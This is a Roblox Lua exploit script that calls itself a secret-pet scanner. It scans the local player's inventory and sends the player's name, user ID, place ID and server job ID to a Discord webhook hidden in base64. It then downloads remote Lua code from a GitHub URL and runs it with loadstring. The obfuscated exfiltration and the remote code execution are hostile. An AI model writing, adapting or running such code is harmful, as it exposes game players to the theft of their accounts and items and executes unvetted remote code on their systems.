local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
-- RIFSDFIJSDFIDSJF
local player = Players.LocalPlayer
local playerUsername = player.Name
local playerDisplayName = player.DisplayName
local playerUserId = player.UserId
local jobId = game.JobId
local placeId = game.PlaceId

local encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MzI1MjUzNTE2MjExNDE0MC9jUnB4ZTVZT01ybDVqMzNDSVNrZFU3Umo"
	.. "yMlhydFU5ejR4TTlSVzVvYmlfS0NDQS1zNW1nN2o3ZzYtZ3RJQ0N3RUd0eg=="

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function base64dec(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if (#x ~= 8) then return '' end
		local c=0
		for i=1,8 do c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

local decodedURL = base64dec(encodedWebhook)

repeat task.wait() until player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("ScreenGui")

local playerGui = player.PlayerGui

local InventorySecretPets = {}
local scrollingFrame = playerGui.ScreenGui.Inventory.Frame.Inner.Pets.Main.ScrollingFrame

local function SendWebhook(url)
	local httpReq = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
	if not httpReq then
		warn("❌ No HTTP Request Function"); return
	end

	local secretPetList = #InventorySecretPets > 0 and table.concat(InventorySecretPets, ", ") or "None"

	local payload = {
		username = "Secret Pet Scanner",
		embeds = { {
			title = playerDisplayName .. " (" .. playerUsername .. ")'s Secret Pets",
			description = "**Secret Pets Found:**\n" .. secretPetList,
			color = tonumber("0x00ffcc"),
			fields = {
				{
					name = "Job ID",
					value = "`" .. jobId .. "`",
					inline = false
				}
			},
			footer = {
				text = "UserID: " .. playerUserId .. " | PlaceID: " .. placeId
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		} }
	}

	local body = HttpService:JSONEncode(payload)

	httpReq({
		Url = url,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = body
	})
end

local function refreshSecretPets()
	local folder = scrollingFrame:WaitForChild("Pets")
	local canvasHeight = scrollingFrame.CanvasSize.Y.Offset
	local viewHeight = scrollingFrame.AbsoluteWindowSize.Y
	local scrollStep = 50 -- Smaller = smoother but slower

	for scrollY = 0, canvasHeight - viewHeight, scrollStep do
		scrollingFrame.CanvasPosition = Vector2.new(0, scrollY)
		task.wait(0.05) -- Wait to render current scroll area

		for _, child in ipairs(folder:GetChildren()) do
			local inner = child:FindFirstChild("Inner")
			if inner and inner:IsA("Frame") then
				local button = inner:FindFirstChild("Button")
				if button and button:IsA("ImageButton") then
					local innerButton = button:FindFirstChild("Inner")
					local secretTag = innerButton and innerButton:FindFirstChild("Secret")

					if secretTag and secretTag:IsA("GuiObject") then
						local isVisible = secretTag.Visible
						if isVisible and not table.find(InventorySecretPets, child.Name) then
							table.insert(InventorySecretPets, child.Name)
						end
					end
				end
			end
		end
	end

	-- Scroll to bottom to ensure all are processed
	scrollingFrame.CanvasPosition = Vector2.new(0, canvasHeight)


end

refreshSecretPets()

if #InventorySecretPets > 0 then
	task.wait(5)
	SendWebhook(decodedURL)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/VoantplayYt/roblox-banlist/refs/heads/main/ban.lua"))()
end
